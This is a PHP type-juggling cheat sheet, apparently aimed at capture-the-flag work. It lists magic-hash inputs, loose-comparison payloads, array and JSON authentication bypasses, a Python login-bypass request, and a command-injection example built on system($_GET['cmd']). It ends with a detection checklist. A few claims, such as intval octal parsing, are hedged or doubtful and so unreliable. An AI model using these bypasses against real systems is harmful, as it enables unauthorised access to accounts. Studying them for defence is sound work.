# PHP Type Juggling

## Loose Comparison (`==`)
PHP `==` performs type coercion before comparison. This creates exploitable equivalences.

### String-to-Number Coercion
```php
"0" == false     // true
"" == false      // true
"0e12345" == 0   // true (scientific notation → 0)
"0e12345" == "0" // true
"1abc" == 1      // true (leading digits parsed)
NULL == false    // true
NULL == 0        // true
NULL == ""       // true
```

### Magic Hashes
**When**: Password comparison uses `==` and hash starts with `0e` followed by only digits → PHP interprets as float 0.
```
MD5 magic hashes (md5($input) starts with "0e" + digits only):
  "240610708"     → 0e462097431906509019562988736854
  "QNKCDZO"       → 0e830400451993494058024219903391
  "aabg7XSs"      → 0e087386482136013740957780965295

SHA1 magic hashes:
  "aaroZmOk"      → 0e66507019969427134894567494305185566735
  "aaK1STfY"      → 0e76658526655756207688271159624026011393
```
```python
# IN: target_hash_func (md5/sha1), comparison uses ==  OUT: input that matches "0"
# Any of the above magic hash inputs will == "0" or == any other 0e... hash
# because PHP evaluates 0e... == 0e... as 0 == 0 → true
```

### Integer Comparison Tricks
```php
// POST: password=0  (integer zero)
if ($_POST['password'] == $stored_hash) { ... }
// If $stored_hash starts with a letter: "abc123" == 0 → true!

// Array bypass
// POST: password[]=anything
if ($_POST['password'] == $stored_hash) { ... }
// array == string → false in PHP 8+, but in PHP 7: warning + true in some contexts
```

## Type Juggling in `strcmp`
```php
// strcmp(array, string) returns NULL in PHP < 8
// NULL == 0 → true
if (strcmp($_POST['password'], $secret) == 0) { /* bypass! */ }
// Send: password[]=anything
```

## `intval` / `is_numeric` Bypass
```php
// is_numeric("0x1A") → true in PHP 5, false in PHP 7+
// intval("0123") = 83 (octal!) in some contexts
// intval("1e2") = 100 (scientific notation)

// Bypass: if (intval($input) > 1000 && intval($input) < 9999)
// Send: "1337a" → intval returns 1337, but string operations see "1337a"
```

## JSON Type Confusion
```php
// When PHP decodes JSON, types are preserved:
// {"password": 0}     → integer 0 (matches any string starting with non-digit)
// {"password": true}  → boolean true (== any non-empty, non-"0" string)
// {"admin": true}     → boolean true

// Exploit: send JSON with integer 0 or boolean true instead of string
```
```python
# IN: target URL with JSON body  OUT: bypass authentication
import requests
# Normal: {"username":"admin","password":"secret"}
# Attack: {"username":"admin","password":0}
r = requests.post(url, json={"username": "admin", "password": 0})
# Or: {"username":"admin","password": true}
```

## `switch` Statement
```php
// switch uses loose comparison (==)
switch ($input) {
    case 0: echo "zero"; break;    // "abc" matches here! ("abc" == 0 → true)
    case 1: echo "one"; break;
}
```

## `in_array` Without Strict
```php
// in_array("1abc", [0, 1, 2]) → true (coerces "1abc" to 1)
// Fix: in_array($val, $arr, true) — strict mode
```

## `preg_match` Integer Bypass
```php
// preg_match expects string; passing array returns false (no match → bypass)
if (!preg_match('/[^a-z]/', $_GET['cmd'])) { system($_GET['cmd']); }
// Send: cmd[]=id → preg_match returns false → bypass
```

## PHP 8 Changes
PHP 8 tightened comparisons:
- `0 == "foo"` → **false** in PHP 8 (was true in PHP 7)
- `"" == 0` → **false** in PHP 8
- `strcmp(array, string)` → TypeError in PHP 8

**Trap**: Check PHP version. Many CTFs still use PHP 7.x where loose comparison is exploitable. Magic hashes still work in PHP 8 (`"0e123" == "0e456"` is still `0.0 == 0.0 → true`).

## Detection
Look for: `==` instead of `===`, `strcmp` without strict, `in_array` without third arg, JSON input parsed then compared, `switch` on user input.
